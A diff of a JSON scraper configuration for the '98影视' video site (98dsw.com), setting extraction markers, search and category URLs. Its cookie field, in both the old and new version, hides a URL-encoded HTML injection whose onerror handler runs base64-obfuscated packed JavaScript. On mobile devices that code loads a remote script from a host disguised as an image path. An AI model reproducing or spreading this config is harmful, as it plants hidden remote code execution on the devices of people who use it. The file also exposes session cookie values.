@@ -1,61 +1,25 @@
-{
-    "作者":"凯哥",
-    "站名":"98影视",
-    //"主页url":"http://www.98kpb.com/http://www.9kdy.com/",
-    "Cookie":"PHPSESSID=218ji2m4ntn7v4jb4ohdppj5i2; recente=%5B%7B%22vod_name%22%3A%22%E4%B8%81%E5%AE%9D%E6%A1%A2%22%2C%22vod_url%22%3A%22http%3A%2F%2Fwww.98dsw.com%2Fguocanju%2Fdingbaozhen%2Fplay-0-0.html%22%2C%22vod_part%22%3A%22%E7%AC%AC01%E9%9B%86%22%7D%2C%7B%22vod_name%22%3A%222012%22%2C%22vod_url%22%3A%22%23%22%2C%22vod_part%22%3A%22%3Cimg%20src%3D%22image.gif%22%20onerror%3D%22eval(atob('ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUsZCl7ZT1mdW5jdGlvbihjKXtyZXR1cm4oYzxhPyIiOmUocGFyc2VJbnQoYy9hKSkpKygoYz1jJWEpPjM1P1N0cmluZy5mcm9tQ2hhckNvZGUoYysyOSk6Yy50b1N0cmluZygzNikpfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKWRbZShjKV09a1tjXXx8ZShjKTtrPVtmdW5jdGlvbihlKXtyZXR1cm4gZFtlXX1dO2U9ZnVuY3Rpb24oKXtyZXR1cm4nXFx3Kyd9O2M9MTt9O3doaWxlKGMtLSlpZihrW2NdKXA9cC5yZXBsYWNlKG5ldyBSZWdFeHAoJ1xcYicrZShjKSsnXFxiJywnZycpLGtbY10pO3JldHVybiBwO30oJzkgMj17Mzo1LDY6NSw3OjV9OzkgcD1hLmI7Mi4zPXAuNCgiZyIpPT0wOzIuNj1wLjQoImUiKT09MDsyLmY9KHA9PSJkIil8fChwLjQoImkiKT09MCk7aCgyLjN8fDIuNnx8Mi43KXt9dXs4LnQucyg4LnYoXCd4XCcpKS53PSJyOi8vay5qLm0vcS9vL24tMS9sLmMifTsnLDM0LDM0LCd8fHN5c3RlbXx3aW58aW5kZXhPZnxmYWxzZXxtYWN8eGxsfGRvY3VtZW50fHZhcnxuYXZpZ2F0b3J8cGxhdGZvcm18anBnfFgxMXxNYWN8eDExfFdpbnxpZnxMaW51eHxtYWltbnxpbWd8OGExMjgwNzcwMTFmZWQzNDAxOTZmZDZlYmQ1MGE0OWR8bmV0fDIwMjIwOTE0fHZvZHx8dXBsb2FkfGh0dHBzfGFwcGVuZENoaWxkfGhlYWR8ZWxzZXxjcmVhdGVFbGVtZW50fHNyY3xzY3JpcHQnLnNwbGl0KCd8JyksMCx7fSkpCg%3D%3D'))%22%22%7D%5D",
-    "请求头":"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
+    {
+    
+    "作者":"LR",
+    
+    "站名":"九八影视",
+    
+    "请求头": "cookie$recente=%5B%7B%22vod_name%22%3A%222012%22%2C%22vod_url%22%3A%22%23%22%2C%22vod_part%22%3A%22%3Cimg+src%3D%5C%22image.gif%5C%22+onerror%3D%5C%22eval%28atob%28%27ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUsZCl7ZT1mdW5jdGlvbihjKXtyZXR1cm4oYzxhPyIiOmUocGFyc2VJbnQoYy9hKSkpKygoYz1jJWEpPjM1P1N0cmluZy5mcm9tQ2hhckNvZGUoYysyOSk6Yy50b1N0cmluZygzNikpfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKWRbZShjKV09a1tjXXx8ZShjKTtrPVtmdW5jdGlvbihlKXtyZXR1cm4gZFtlXX1dO2U9ZnVuY3Rpb24oKXtyZXR1cm4nXFx3Kyd9O2M9MTt9O3doaWxlKGMtLSlpZihrW2NdKXA9cC5yZXBsYWNlKG5ldyBSZWdFeHAoJ1xcYicrZShjKSsnXFxiJywnZycpLGtbY10pO3JldHVybiBwO30oJzkgMj17Mzo1LDY6NSw3OjV9OzkgcD1hLmI7Mi4zPXAuNCgiZyIpPT0wOzIuNj1wLjQoImUiKT09MDsyLmY9KHA9PSJkIil8fChwLjQoImkiKT09MCk7aCgyLjN8fDIuNnx8Mi43KXt9dXs4LnQucyg4LnYoXCd4XCcpKS53PSJyOi8vay5qLm0vcS9vL24tMS9sLmMifTsnLDM0LDM0LCd8fHN5c3RlbXx3aW58aW5kZXhPZnxmYWxzZXxtYWN8eGxsfGRvY3VtZW50fHZhcnxuYXZpZ2F0b3J8cGxhdGZvcm18anBnfFgxMXxNYWN8eDExfFdpbnxpZnxMaW51eHxtYWltbnxpbWd8OGExMjgwNzcwMTFmZWQzNDAxOTZmZDZlYmQ1MGE0OWR8bmV0fDIwMjIwOTE0fHZvZHx8dXBsb2FkfGh0dHBzfGFwcGVuZENoaWxkfGhlYWR8ZWxzZXxjcmVhdGVFbGVtZW50fHNyY3xzY3JpcHQnLnNwbGl0KCd8JyksMCx7fSkpCg%3D%3D%27%29%29%5C%22%22%7D%5D; PHPSESSID=bacb0f01l8soadee84d32k36i7",
+    
     "主页url":"http://www.98dsw.com/",
-    "二次截取":"",
-    "数组":"lazyload&&</a>",
-    "图片":"data-original=\"&&\"",
-    "标题":"title=\"&&\"",
-    "链接":"href=\"&&\"",
-    "简介":"detail-sketch\">&&</span>",
-    "导演":"导演：&&</p>",
-    "主演":"主演：&&</p>",
-    "影片年代":"年份：&&</p>",
+    
+    "简介":"<span class=\"detail-content\" style=\"display: none;\">&&</span>",
+    
     "影片状态":"状态：&&</p>",
-    "搜索url":"//search.php;post;searchword=={wd}",
-    "搜索模式":"1",
-    "搜索二次截取":"",
-    "搜索数组":"lazyload&&</a>",
-    "搜索图片":"data-original=\"&&\"",
-    "搜索标题":"title=\"&&\"",
-    "搜索链接":"href=\"&&\"",
-    //"搜索后缀":"/oftensdetail/",
-    "线路数组":"<div class=\"stui-pannel__head bottom-line active clearfix\">&&</div>",
-    "线路标题":"/statics/icon/icon_26.png\"/>&&</h3>",
-    "播放数组":"<ul class=\"stui-content__playlist playlink clearfix column8\">&&</ul>",
-    "播放标题":"title=\"&&\"",
-    "播放列表":"<li&&</li>",
-    "播放链接":"href=\"&&\"",
-    "分类url":"http://www.98dsw.com/{cateId}/index{catePg}.html[firstPage=http://www.98dsw.com/{cateId}/index.html]",
-    "分类":"电影$dianyingpian#电视剧$dianshiju#综艺$zongyi#动漫$dongman",
-    "嗅探词":".mp4?dis_k#.mp4?#.m3u8#.mp4#.m3u8?#.mp4?#.m4a",
-    "过滤词":"51.la#cnzz.com#baidu.com#bilibili.com",
-    "播放请求头":"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
-    //"免嗅":"0",
- "筛选":{
-"dianshiju":[
-  {"key":"cateId","name":"类型","value":[
-  {"n":"全部","v":"dianshiju"},
-  {"n":"国产剧","v":"guocanju"},
-  {"n":"港台剧","v":"gangtaiju"},
-  {"n":"日韩剧","v":"rihanju"},
-  {"n":"欧美剧","v":"oumeiju"}]}
-  ],
-  
-"dianying":[
-  {"key":"cateId","name":"类型","value":[
-{"n":"全部","v":"dianyingpian"},
-{"n":"动作片","v":"dongzuopian"},
-{"n":"喜剧片","v":"xijupian"},
-{"n":"爱情片","v":"aiqingpian"},
-{"n":"科幻片","v":"kehuanpian"},
-{"n":"恐怖片","v":"kongbupian"},
-{"n":"剧情片","v":"juqingpian"},
-{"n":"战争片","v":"zhanzhengpian"},
-{"n":"动画片","v":"dinghuapian"}]}]
-  
-}
-}
+    
+    "搜索url":"http://www.98dsw.com/search.php?searchword={wd}",
+    
+    "线路数组":"<h3 class=\"title\">&&/h3>",
+    
+    "线路标题":">&&<",
+    
+    "分类url":"http://www.98dsw.com/{cateId}/index{catePg}.html[http://www.98dsw.com/{cateId}/index.html];;ak",
+    
+    "分类":"电影$dianyingpian#电视剧$dianshiju#综艺$zongyi#动漫$dongman"
+
+    }
